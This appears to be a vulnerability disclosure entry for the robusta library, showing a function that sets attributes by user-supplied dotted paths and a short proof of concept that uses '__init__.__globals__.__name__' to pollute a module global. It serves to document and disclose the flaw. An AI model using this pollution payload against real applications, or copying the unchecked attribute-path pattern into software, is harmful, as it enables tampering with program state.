## robusta

### Meta

+ Library: robusta
+ Stars: 2.6K
+ Version: 0.20.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```update_item_attr(obj, '__init__.__globals__.__name__', 'polluted')```
+ Foundby: Zhong
+ Report: Pending
+ Type: App
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/robusta-dev/robusta

### Vulnerable Code Snippet

```python
def update_item_attr(obj: HikaruBase, attr_key: str, attr_value):
    path_parts = regex.split("\\[|\\].|\\]|\\.", attr_key)
    parent_item = obj.object_at_path(path_parts[0 : len(path_parts) - 1])
    last_part = path_parts[len(path_parts) - 1]
    if type(parent_item) == dict:
        parent_item[last_part] = attr_value
    elif type(parent_item) == list:
        parent_item[int(last_part)] = attr_value
    else:
        setattr(parent_item, last_part, attr_value)
```
### PoC

```python
from robusta.api import update_item_attr
from hikaru import HikaruBase
import random

class Animal(HikaruBase):
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)
update_item_attr(obj, '__init__.__globals__.__name__', 'polluted')

print(__name__)
```